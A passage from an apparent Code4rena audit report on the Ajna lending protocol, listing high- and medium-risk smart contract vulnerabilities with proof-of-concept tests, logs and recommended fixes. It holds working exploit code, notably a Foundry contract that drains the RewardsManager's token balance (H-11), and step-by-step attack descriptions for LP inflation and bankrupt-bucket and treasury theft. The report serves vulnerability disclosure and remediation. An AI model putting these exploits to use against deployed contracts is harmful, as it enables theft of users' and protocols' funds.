
        // Continuosly invoke memorializePositions with the min allowance
        // until Pool lp balance is 0.
        while (
            poolLPBalanceIndex1 != 0 &&
            poolLPBalanceIndex2 != 0 &&
            poolLPBalanceIndex3 != 0
        ) {
            // Increase manager allowance.
            _pool.increaseLPAllowance(
                address(_positionManager),
                indexes,
                amounts
            );

            // Memorialize quote tokens into minted NFT.
            IPositionManagerOwnerActions.MemorializePositionsParams
                memory memorializeParams = IPositionManagerOwnerActions
                    .MemorializePositionsParams(tokenId, indexes);
            _positionManager.memorializePositions(memorializeParams);

            // Get new Pool lp balances.
            (poolLPBalanceIndex1, ) = _pool.lenderInfo(
                indexes[0],
                testsAddress
            );
            (poolLPBalanceIndex2, ) = _pool.lenderInfo(
                indexes[1],
                testsAddress
            );
            (poolLPBalanceIndex3, ) = _pool.lenderInfo(
                indexes[2],
                testsAddress
            );
        }

        // Pool lp balances after.
        console.log("\n Pool lp balances after:");
        console.log("bucket %s: %s", indexes[0], poolLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], poolLPBalanceIndex2);
        console.log("bucket %s: %s", indexes[2], poolLPBalanceIndex3);

        // PositionManager lp balances after.
        (managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[0]
        );
        (managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[1]
        );
        (managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[2]
        );

        console.log("\n PositionManger lp balances after:");
        console.log("bucket %s: %s", indexes[0], managerLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], managerLPBalanceIndex1);
        console.log("bucket %s: %s \n", indexes[2], managerLPBalanceIndex1);

        finalLPBalance =
            managerLPBalanceIndex1 +
            managerLPBalanceIndex2 +
            managerLPBalanceIndex3;

        // Assert that the initial and ending balances are equal.
        assertEq(intialLPBalance, finalLPBalance);
    }
}

```

For reference the log outputs that display the overall change in the users position are the following:

     Pool lp balances before:
      bucket 2550: 3000000000000000000000
      bucket 2551: 3000000000000000000000
      bucket 2552: 3000000000000000000000
      
     PositionManger lp balances before:
      bucket 2550: 0
      bucket 2551: 0
      bucket 2552: 0
      
     <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->
      
     Pool lp balances after:
      bucket 2550: 0
      bucket 2551: 0
      bucket 2552: 0
      
     PositionManger lp balances after:
      bucket 2550: 4501500000000000000000000
      bucket 2551: 4501500000000000000000000
      bucket 2552: 4501500000000000000000000 

      Error: a == b not satisfied [uint]
        Expected: 13504500000000000000000000
          Actual: 9000000000000000000000

The test case simulates a user that has created a position by providing 9,000 tokens as liquidity into a pool depositing 3,000 tokens, each, into price buckets 2550, 2551, and 2552. An NFT is then minted for the user. The test case then iteratively approves the PositionManager contract for an allowance of 1 token for each price bucket and invokes the memorializePositions function, repeating these steps until the Pool lp balance for their positions are 0. As can be seen by the log output, the value of the position per price bucket dramatically increases with the position in each bucket being valued at 4,501,500 tokens by the end of the test. In total, the user's position has increased in value from 9,000 tokens to 13,504,500 tokens.

### Tools Used

Foundry

### Recommended Mitigation Steps

It is recommended to implement a check within the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) that will ensure that a user has specified an allowance at least equal to their lp balance at each respective index, reverting with a custom error if not true. For example, the function could be refactored to the following where the mentioned check is implemented [here](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L189):

```solidity
    function memorializePositions(
        MemorializePositionsParams calldata params_
    ) external override {
        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        IPool   pool  = IPool(poolKey[params_.tokenId]);
        address owner = ownerOf(params_.tokenId);

        uint256 indexesLength = params_.indexes.length;
        uint256 index;

        for (uint256 i = 0; i < indexesLength; ) {
            index = params_.indexes[i];

            // record bucket index at which a position has added liquidity
            // slither-disable-next-line unused-return
            positionIndex.add(index);

            (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);

            // check that specified allowance is at least equal to the lp balance
            uint256 allowance = pool.lpAllowance(index, address(this), owner);

            if(allowance < lpBalance) revert AllowanceTooLow();

            Position memory position = positions[params_.tokenId][index];

            // check for previous deposits
            if (position.depositTime != 0) {
                // check that bucket didn't go bankrupt after prior memorialization
                if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {
                    // if bucket did go bankrupt, zero out the LP tracked by position manager
                    position.lps = 0;
                }
            }

            // update token position LP
            position.lps += lpBalance;
            // set token's position deposit time to the original lender's deposit time
            position.depositTime = depositTime;

            // save position in storage
            positions[params_.tokenId][index] = position;

            unchecked { ++i; }
        }

        // update pool LP accounting and transfer ownership of LP to PositionManager contract
        pool.transferLP(owner, address(this), params_.indexes);

        emit MemorializePosition(owner, params_.tokenId, params_.indexes);
    }
```

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/256#issuecomment-1555117255)**



***

## [[H-08] Claiming accumulated rewards while the contract is underfunded can lead to a loss of rewards](https://github.com/code-423n4/2023-05-ajna-findings/issues/251)
*Submitted by [aviggiano](https://github.com/code-423n4/2023-05-ajna-findings/issues/251), also found by [0xSmartContract](https://github.com/code-423n4/2023-05-ajna-findings/issues/498), [Evo](https://github.com/code-423n4/2023-05-ajna-findings/issues/441), [Jerry0x](https://github.com/code-423n4/2023-05-ajna-findings/issues/436), [tsvetanovv](https://github.com/code-423n4/2023-05-ajna-findings/issues/423), [Audinarey](https://github.com/code-423n4/2023-05-ajna-findings/issues/384), [kenta](https://github.com/code-423n4/2023-05-ajna-findings/issues/378), [0xcm](https://github.com/code-423n4/2023-05-ajna-findings/issues/361), [patitonar](https://github.com/code-423n4/2023-05-ajna-findings/issues/326), [sakshamguruji](https://github.com/code-423n4/2023-05-ajna-findings/issues/307), [BGSecurity](https://github.com/code-423n4/2023-05-ajna-findings/issues/301), [Audit\_Avengers](https://github.com/code-423n4/2023-05-ajna-findings/issues/292), [mrvincere](https://github.com/code-423n4/2023-05-ajna-findings/issues/264), [bytes032](https://github.com/code-423n4/2023-05-ajna-findings/issues/237), [devscrooge](https://github.com/code-423n4/2023-05-ajna-findings/issues/197), [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/186), [Dug](https://github.com/code-423n4/2023-05-ajna-findings/issues/155), [ladboy233](https://github.com/code-423n4/2023-05-ajna-findings/issues/135), [Bauchibred](https://github.com/code-423n4/2023-05-ajna-findings/issues/124), [Bauchibred](https://github.com/code-423n4/2023-05-ajna-findings/issues/119), [Bauchibred](https://github.com/code-423n4/2023-05-ajna-findings/issues/116), [0xTheC0der](https://github.com/code-423n4/2023-05-ajna-findings/issues/114), [ABAIKUNANBAEV](https://github.com/code-423n4/2023-05-ajna-findings/issues/93), and [TS](https://github.com/code-423n4/2023-05-ajna-findings/issues/19)*

The claimable rewards for an NFT staker are capped at the Ajna token balance at the time of claiming, which can lead to a loss of rewards if the `RewardsManager` contract is underfunded with Ajna tokens.

### Impact

Loss of rewards if the `RewardsManager` contract is underfunded with Ajna tokens.

### Proof of Concept

The `RewardsManager` contract keeps track of the rewards earned by an NFT staker. The accumulated rewards are claimed by calling the `RewardsManager.claimRewards` function. Internally, the `RewardsManager._claimRewards` function transfers the accumulated rewards to the staker.

However, the transferrable amount of Ajna token rewards are capped at the Ajna token balance at the time of claiming. If the accumulated rewards are higher than the Ajna token balance, the claimer will receive fewer rewards than expected. The remaining rewards cannot be claimed at a later time as the `RewardsManager` contract does not keep track of the rewards that were not transferred.

**Note**

This issue was already reported on [Sherlock's audit contest](https://github.com/sherlock-audit/2023-01-ajna-judging/issues/120), and was marked as [`Fixed`](https://github.com/ajna-finance/audits) by the Ajna team (Issue M-8).

Nevertheless, the problem still exists, as it can be seen through the following test:

```diff
diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol
index 314b476..6642a4e 100644
--- a/ajna-core/src/RewardsManager.sol
+++ b/ajna-core/src/RewardsManager.sol
@@ -582,6 +582,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
             epochToClaim_
         );
 
+        // @audit-issue rewardsEarned (ClaimReward event) is not necessarily what's transferred (Transfer event)
         emit ClaimRewards(
             msg.sender,
             ajnaPool_,
@@ -812,6 +813,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         // check that rewards earned isn't greater than remaining balance
         // if remaining balance is greater, set to remaining balance
         uint256 ajnaBalance = IERC20(ajnaToken).balanceOf(address(this));
+        // @audit-issue rewardsEarned (ClaimReward event) is not necessarily what's transferred (Transfer event)
         if (rewardsEarned_ > ajnaBalance) rewardsEarned_ = ajnaBalance;
 
         if (rewardsEarned_ != 0) {
diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol b/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol
index 93fe062..74a70d5 100644
--- a/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol
+++ b/ajna-core/tests/forge/unit/Rewards/RewardsDSTestPlus.sol
@@ -162,6 +162,8 @@ abstract contract RewardsDSTestPlus is IRewardsManagerEvents, ERC20HelperContrac
         uint256 currentBurnEpoch = IPool(pool).currentBurnEpoch();
         vm.expectEmit(true, true, true, true);
         emit ClaimRewards(from, pool, tokenId, epochsClaimed, reward);
+        vm.expectEmit(true, true, true, true);
+        emit Transfer(address(_rewardsManager), from, reward);
         _rewardsManager.claimRewards(tokenId, currentBurnEpoch);
 
         assertEq(_ajnaToken.balanceOf(from), fromAjnaBal + reward);
@@ -267,8 +269,8 @@ abstract contract RewardsHelperContract is RewardsDSTestPlus {
         _poolTwo       = ERC20Pool(_poolFactory.deployPool(address(_collateralTwo), address(_quoteTwo), 0.05 * 10**18));
 
         // provide initial ajna tokens to staking rewards contract
-        deal(_ajna, address(_rewardsManager), 100_000_000 * 1e18);
-        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 100_000_000 * 1e18);
+        deal(_ajna, address(_rewardsManager), 40 * 1e18);
+        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 40 * 1e18); // @audit-issue RewardsManager is now underfunded, contains less AJNA than users' rewards
     }
 
     // create a new test borrower with quote and collateral sufficient to draw a specified amount of debt
diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol
index 4100e9f..3eaacd7 100644
--- a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol
+++ b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol
@@ -1843,6 +1843,15 @@ contract RewardsManagerTest is RewardsHelperContract {
         });
         assertLt(_ajnaToken.balanceOf(_minterOne), tokensToBurn);
 
+
+        // try to claim again and get remaining rewards, will revert with `AlreadyClaimed()`
+        _claimRewards({
+            pool:          address(_pool),
+            from:          _minterOne,
+            tokenId:       tokenIdOne,
+            reward:        40.899689081331351737 * 1e18,
+            epochsClaimed: _epochsClaimedArray(1, 0)
+        });
     }
 
     /********************/

```

Since the problem still exists, I am reporting it here. You can find below a conversation with Ian Harvey from the Ajna team, where we discuss how the problem was incorrectly marked as solved:

> aviggiano — Yesterday at 4:37 PM
> Hi there<br>
> I am reviewing the Ajna smart contracts and I have a question regarding previous audit reports.<br>
> <https://github.com/ajna-finance/audits><br>
> It seems like some findings are marked as "Fixed" but I believe they were not (see M-8).<br>
> Should I re-submit a previous finding, if the contract is in scope? or are those considered out of scope?<br>
> M-8 is this one<br>
> <https://github.com/sherlock-audit/2023-01-ajna-judging/issues/120><br>
> Ian Harvey | Ajna — Yesterday at 7:01 PM<br>
> Checking<br>
> Ian Harvey | Ajna — Yesterday at 7:11 PM<br>
> That was solved here -> <https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L811>

### Tools Used

Past audit report

### Recommended Mitigation Steps

*   Consider reverting if there are insufficient Ajna tokens available as rewards. This is the best immediate solution to the problem.
*   Create unit tests for each issue identified in the audit report and confirm that it has been properly addressed. This will prevent recurring problems where the development team believes an issue has been resolved, but in reality, it has not.
*   Create a separate pull request for each finding and mark the issue in the audit table. This will help developers and auditors verify whether the issue has been resolved or not, and will make future audits more manageable, ultimately improving the overall quality and security of the protocol.

**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2023-05-ajna-findings/issues/251#issuecomment-1567506799)**

**[MikeHathaway (Ajna) confirmed via duplicate issue `#361`](https://github.com/code-423n4/2023-05-ajna-findings/issues/361#issuecomment-1555143539)**



***

## [[H-09] User can avoid bankrupting by calling `PositionManager.moveLiquidity` where to index is bankrupted index](https://github.com/code-423n4/2023-05-ajna-findings/issues/179)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-05-ajna-findings/issues/179), also found by [J4de](https://github.com/code-423n4/2023-05-ajna-findings/issues/348), [SpicyMeatball](https://github.com/code-423n4/2023-05-ajna-findings/issues/111), and [volodya](https://github.com/code-423n4/2023-05-ajna-findings/issues/17)*

Bucket could become insolvent and in that case all LP within the bucket are zeroed out (lenders lose all their LP). Because of that, `PositionManager.reedemPositions` [will not allow to redeem index that is bankrupted](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L372).

When user wants to move his LPs from one bucket to another he can call `PositionManager.moveLiquidity` where he will provide from and to indexes.

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L262-L333>

```solidity
    function moveLiquidity(
        MoveLiquidityParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

        MoveLiquidityLocalVars memory vars;
        vars.depositTime = fromPosition.depositTime;

        // handle the case where owner attempts to move liquidity after they've already done so
        if (vars.depositTime == 0) revert RemovePositionFailed();

        // ensure bucketDeposit accounts for accrued interest
        IPool(params_.pool).updateInterest();

        // retrieve info of bucket from which liquidity is moved  
        (
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bankruptcyTime,
            vars.bucketDeposit,
        ) = IPool(params_.pool).bucketInfo(params_.fromIndex);

        // check that bucket hasn't gone bankrupt since memorialization
        if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();

        // calculate the max amount of quote tokens that can be moved, given the tracked LP
        vars.maxQuote = _lpToQuoteToken(
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bucketDeposit,
            fromPosition.lps,
            vars.bucketDeposit,
            _priceAt(params_.fromIndex)
        );

        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        // remove bucket index from which liquidity is moved from tracked positions
        if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();

        // update bucket set at which a position has liquidity
        // slither-disable-next-line unused-return
        positionIndex.add(params_.toIndex);

        // move quote tokens in pool
        (
            vars.lpbAmountFrom,
            vars.lpbAmountTo,
        ) = IPool(params_.pool).moveQuoteToken(
            vars.maxQuote,
            params_.fromIndex,
            params_.toIndex,
            params_.expiry
        );

        Position storage toPosition = positions[params_.tokenId][params_.toIndex];

        // update position LP state
        fromPosition.lps -= vars.lpbAmountFrom;
        toPosition.lps   += vars.lpbAmountTo;
        // update position deposit time to the from bucket deposit time
        toPosition.depositTime = vars.depositTime;

        emit MoveLiquidity(
            ownerOf(params_.tokenId),
            params_.tokenId,
            params_.fromIndex,
            params_.toIndex,
            vars.lpbAmountFrom,
            vars.lpbAmountTo
        );
    }
```

As you can see `from` bucket is checked to be not bankrupted before the moving.<br>
And after the move, LPs of `from` and `to` buckets are updated.<br>
Also `depositTime` of `to` bucket is updated to `from.depositTime`.<br>

The problem here is that `to` bucket was never checked to be not bankrupted.<br>
Because of that it's possible that bankrupted `to` bucket now becomes not bankrupted as their depositTime is updated now.

This is how this can be used by attacker.<br>
1. Attacker has lp shares in the bucket, linked to token and this bucket became bankrupt.
2. Then attacker mints small amount of LP in the Pool and then memorizes this index to the token.
3. Attacker calls `moveLiquidity` with `from`: new bucket and `to`: bankrupt bucket.
4. Now attacker can redeem his lp shares from bankrupt bucket as depositedTime is updated now.

As result, attacker was able to steal LPs of another people from `PositionManager` contract.

### Tools Used

VsCode

### Recommended Mitigation Steps

In case if `to` bucket is bankrupt, then clear LP for it before adding moved lp shares.

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/179#issuecomment-1555097722)**



***

## [[H-10] missing `isEpochClaimed` validation](https://github.com/code-423n4/2023-05-ajna-findings/issues/132)
*Submitted by [Jorgect](https://github.com/code-423n4/2023-05-ajna-findings/issues/132), also found by [shealtielanz](https://github.com/code-423n4/2023-05-ajna-findings/issues/316) and [ABAIKUNANBAEV](https://github.com/code-423n4/2023-05-ajna-findings/issues/152)*

User can claim rewards even when is already claimed

### Proof of Concept

The \_claimRewards function is using to calculate and send the reward to the caller but this function is no validating if isEpochClaimed mapping is true due that in claimRewards function is validated, see the stament in the following lines:

    file: ajna-core/src/RewardsManager.sol
    function claimRewards(
            uint256 tokenId_,
            uint256 epochToClaim_ 
        ) external override {
            StakeInfo storage stakeInfo = stakes[tokenId_];

            if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit(); 

            if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed(); // checking if the epoch was claimed;

            _claimRewards(
                stakeInfo,
                tokenId_,
                epochToClaim_,
                true,
                stakeInfo.ajnaPool
            );
        }

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L114-L125>

Now the moveStakedLiquidity is calling \_claimRewards too without validate isEpochClaimed mapping:

    file: ajna-core/src/RewardsManager.sol
    function moveStakedLiquidity(
            uint256 tokenId_,
            uint256[] memory fromBuckets_,
            uint256[] memory toBuckets_,
            uint256 expiry_
        ) external override nonReentrant {
            StakeInfo storage stakeInfo = stakes[tokenId_];

            if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit(); 

            uint256 fromBucketLength = fromBuckets_.length;
            if (fromBucketLength != toBuckets_.length)
                revert MoveStakedLiquidityInvalid();

            address ajnaPool = stakeInfo.ajnaPool;
            uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();

            // claim rewards before moving liquidity, if any
            _claimRewards(stakeInfo, tokenId_, curBurnEpoch, false, ajnaPool); // no checking is isEpochClaimed is true and revert

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L135-L159>

Also we can see in the \_claimRewards function there is no validation is isEpochClaimed is true, this allow  a malicius user claimReward first and then move his liquidity to other bucket or the same bucket claiming the reward each time that he want.

    function _claimRewards(
            StakeInfo storage stakeInfo_,
            uint256 tokenId_,
            uint256 epochToClaim_,
            bool validateEpoch_,
            address ajnaPool_
        ) internal {
            // revert if higher epoch to claim than current burn epoch
            if (
                validateEpoch_ &&
                epochToClaim_ > IPool(ajnaPool_).currentBurnEpoch()
            ) revert EpochNotAvailable();

            // update bucket exchange rates and claim associated rewards
            uint256 rewardsEarned = _updateBucketExchangeRates(
                ajnaPool_,
                positionManager.getPositionIndexes(tokenId_)
            );

            rewardsEarned += _calculateAndClaimRewards(tokenId_, epochToClaim_);

            uint256[] memory burnEpochsClaimed = _getBurnEpochsClaimed(
                stakeInfo_.lastClaimedEpoch,
                epochToClaim_
            );

            emit ClaimRewards(
                msg.sender,
                ajnaPool_,
                tokenId_,
                burnEpochsClaimed,
                rewardsEarned
            );

            // update last interaction burn event
            stakeInfo_.lastClaimedEpoch = uint96(epochToClaim_);

            // transfer rewards to sender
            _transferAjnaRewards(rewardsEarned);
        }

### Recommended Mitigation Steps

Check if the isEpochClaime is true and revert in the \_claimReward function

    if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed();

**[ith-harvey (Ajna) disputed and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/132#issuecomment-1611598236):**
> The series of calls they are suggesting are possible:<br>
> stake<br>
> claimRewards() -> get rewards<br>
> moveStakedLiquidity() ->  get rewards
> 
> They should not be able to get these rewards because `_calculateAndClaimRewards()` iterates from last claimed epoch.



***

## [[H-11] RewardsManager fails to validate `pool_` when updating exchange rates allowing rewards to be drained](https://github.com/code-423n4/2023-05-ajna-findings/issues/8)
*Submitted by [vakzz](https://github.com/code-423n4/2023-05-ajna-findings/issues/8), also found by [0xWaitress](https://github.com/code-423n4/2023-05-ajna-findings/issues/207), [SpicyMeatball](https://github.com/code-423n4/2023-05-ajna-findings/issues/151), and [0xStalin](https://github.com/code-423n4/2023-05-ajna-findings/issues/64)*

<https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L310-L318><br>
<https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L794-L794><br>
<https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L811-L821>

The `updateBucketExchangeRatesAndClaim` method is designed to reward people for keeping the current exchange rate up to date (it has the following description: "Caller can claim `5%` of the rewards that have accumulated to each bucket since the last burn event, if it hasn't already been updated").

The issue is that there is no check on the `pool_` to ensure that is a valid ajna pool or that it is a pool from a currently staked token.

This means that an attacker can supply their own contract to control all of the values used to calculate the reward amount, allowing them to transfer an arbitrary amount of reward tokens (up to the balance of the rewards manager).

### Proof of Concept

The following test can be placed in <https://github.com/code-423n4/2023-05-ajna/tree/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/tests/forge/unit/Rewards> as `StealRewards.t.sol` and then run with `forge test  -m testStealRewards -vv`, showing that an attacker can steal all of the ajna tokens held by the rewards manager:

```bash
$ forge test  -m testStealRewards -vv

Running 1 test for tests/forge/unit/Rewards/StealRewards.t.sol:StealRewardsTest
[PASS] testStealRewards() (gas: 494833)
Logs:
  Rewards balance before: 100000000000000000000000000
  Hacker balance before : 0
  Rewards balance after : 0
  Hacker balance after  : 100000000000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 6.57s
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import 'src/RewardsManager.sol';
import 'src/PositionManager.sol';

import '@std/Test.sol';
import '@std/Vm.sol';

contract StealRewards {
    ERC20 ajnaToken;
    IRewardsManager rewardsManager;

    uint256 _currentBurnEpoch;
    uint256 toSteal;

    constructor(ERC20 _ajnaToken, IRewardsManager _rewardsManager) {
        ajnaToken = _ajnaToken;
        rewardsManager = _rewardsManager;
    }

    function currentBurnEpoch() external view returns (uint256) {
        return _currentBurnEpoch;
    }

    function bucketExchangeRate(uint) external view returns (uint256) {
        return 1 ether + _currentBurnEpoch;
    }

    function burnInfo(uint256 index) external view returns (uint256 burnBlock_, uint256 totalInterest_, uint256 totalBurned_) {
        if (index == 1) {
            return (block.timestamp + 2 weeks, 0, 0);
        } else {
            return (block.timestamp + 2 weeks, 1, toSteal * 20);
        }
    }

    function bucketInfo(uint256) external pure returns (
        uint256 lpAccumulator_,
        uint256 availableCollateral_,
        uint256 bankruptcyTime_,
        uint256 bucketDeposit_,
        uint256 bucketScale_
    ) {
        return (0, 0, 0, 1 ether, 0);
    }

    function steal() external {
        toSteal = ajnaToken.balanceOf(address(rewardsManager));

        uint256[] memory depositIndexes = new uint256[](1);
        depositIndexes[0] = 0;

        // setup the `prevBucketExchangeRate`
        _currentBurnEpoch = 1;
        rewardsManager.updateBucketExchangeRatesAndClaim(address(this), depositIndexes);

        _currentBurnEpoch = 2;
        rewardsManager.updateBucketExchangeRatesAndClaim(address(this), depositIndexes);
    }

}

contract StealRewardsTest is Test {
    address internal _ajna = 0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079;
    ERC20 internal _ajnaToken;

    IRewardsManager  internal _rewardsManager;
    IPositionManager internal _positionManager;
    ERC20PoolFactory internal _poolFactory;

    function setUp() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        _ajnaToken       = ERC20(_ajna);
        _poolFactory = new ERC20PoolFactory(_ajna);
        _positionManager = new PositionManager(_poolFactory, new ERC721PoolFactory(_ajna));
        _rewardsManager  = new RewardsManager(_ajna, _positionManager);

        deal(_ajna, address(_rewardsManager), 100_000_000 * 1e18);
        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 100_000_000 * 1e18);
    }

    function testStealRewards() external {
        StealRewards stealRewards = new StealRewards(_ajnaToken, _rewardsManager);
        uint rewardsManagerBalance = _ajnaToken.balanceOf(address(_rewardsManager));

        emit log_named_uint("Rewards balance before", rewardsManagerBalance);
        emit log_named_uint("Hacker balance before ", _ajnaToken.balanceOf(address(stealRewards)));

        stealRewards.steal();

        assertEq(_ajnaToken.balanceOf(address(stealRewards)), rewardsManagerBalance);
        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 0);

        emit log_named_uint("Rewards balance after ", _ajnaToken.balanceOf(address(_rewardsManager)));
        emit log_named_uint("Hacker balance after  ", _ajnaToken.balanceOf(address(stealRewards)));
    }

}
```

### Tools Used

Foundry, IntelliJ

### Recommended Mitigation Steps

The `updateBucketExchangeRatesAndClaim` method should only be able to be called with a valid Ajna pool (see [PositionManager.\_isAjnaPool](https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/PositionManager.sol#L416-L416)) and potentially only allow pools from the currently staked tokens.

**[MikeHathaway (Ajna) confirmed via duplicate issue `#207`](https://github.com/code-423n4/2023-05-ajna-findings/issues/207#issuecomment-1555107286)**



***

 
# Medium Risk Findings (14)
## [[M-01] It is possible to steal the unallocated part of every delegation period budget](https://github.com/code-423n4/2023-05-ajna-findings/issues/465)
*Submitted by [hyh](https://github.com/code-423n4/2023-05-ajna-findings/issues/465), also found by [mrpathfindr](https://github.com/code-423n4/2023-05-ajna-findings/issues/372), [bytes032](https://github.com/code-423n4/2023-05-ajna-findings/issues/338), [circlelooper](https://github.com/code-423n4/2023-05-ajna-findings/issues/321), [Jiamin](https://github.com/code-423n4/2023-05-ajna-findings/issues/274), [Juntao](https://github.com/code-423n4/2023-05-ajna-findings/issues/270), and [aashar](https://github.com/code-423n4/2023-05-ajna-findings/issues/87)*

Attacker can monitor the standard proposals distribution and routinely steal each low activity period remainder by submitting a `transfer to self` proposal and voting a dust amount for it.

Since the criteria for the final slate update is that any increase in total funding votes casted is enough, the attacker's costs are negligible, while the remainder funds during some periods can be substantial enough for the attacker to setup such a monitoring. I.e. as funds are constant share of the treasury, while activity can differ drastically, a situation when there are less viable proposals then funds can routinely happen over time.

The assumption of the current logic is that such unallocated funds will be returned to the treasury, but it will not be the case as the cost of stealing such funds is close to zero.

### Impact

A part of treasury funds can be stolen each period and will not be available for ecosystem funding.

### Proof of Concept

Schematic POC:

1.  Bob monitors the end of each screening period and, whenever it is cheap enough, submits a proposal to send the remainder funds to self via proposeStandard()
2.  Bob votes for it with fundingVote() with the dust votes he have. Since it is low activity period there are room, and it is included to `_topTenProposals`
3.  Bob updates the top slate with updateSlate(), repeating current top slate with his proposal added. Since other proposals cumulatively do not allocate full budget and Bob's proposal have positive funding vote attached, it is included to the slate

This way Bob obtained the remainder funds nearly for free.

Core issue here looks to be the absence of the proposal votes threshold, which allows an attacker to claim the remained without any barrier to entry, i.e. having at hand only dust amount of governance tokens.

Even proposal with zero funding votes can be executed, it is only controlled to be non-negative:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441>

```solidity
    function _validateSlate(uint24 distributionId_, uint256 endBlock, uint256 distributionPeriodFundsAvailable_, uint256[] calldata proposalIds_, uint256 numProposalsInSlate_) internal view returns (uint256 sum_) {
        // check that the function is being called within the challenge period
        if (block.number <= endBlock || block.number > _getChallengeStageEndBlock(endBlock)) {
            revert InvalidProposalSlate();
        }

        // check that the slate has no duplicates
        if (_hasDuplicates(proposalIds_)) revert InvalidProposalSlate();

        uint256 gbc = distributionPeriodFundsAvailable_;
        uint256 totalTokensRequested = 0;

        // check each proposal in the slate is valid
        for (uint i = 0; i < numProposalsInSlate_; ) {
            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];

            // check if Proposal is in the topTenProposals list
            if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();

            // account for fundingVotesReceived possibly being negative
>>          if (proposal.fundingVotesReceived < 0) revert InvalidProposalSlate();
```

The only criteria for state update is greater sum of the funding votes:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L316-L318>

```solidity
        // check if slate of proposals is better than the existing slate, and is thus the new top slate
        newTopSlate_ = currentSlateHash == 0 ||
>>          (currentSlateHash!= 0 && sum > _sumProposalFundingVotes(_fundedProposalSlates[currentSlateHash]));
```

I.e. when the activity is low enough attacker can always maximize the `totalTokensRequested` to be exactly `gbc * 9 / 10`, claiming the difference to itself (i.e. the dust vote supplied proposal is to transfer unallocated part to attacker's account in this case):

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L445-L450>

```solidity
            totalTokensRequested += proposal.tokensRequested;

            // check if slate of proposals exceeded budget constraint ( 90% of GBC )
>>          if (totalTokensRequested > (gbc * 9 / 10)) {
                revert InvalidProposalSlate();
            }
```

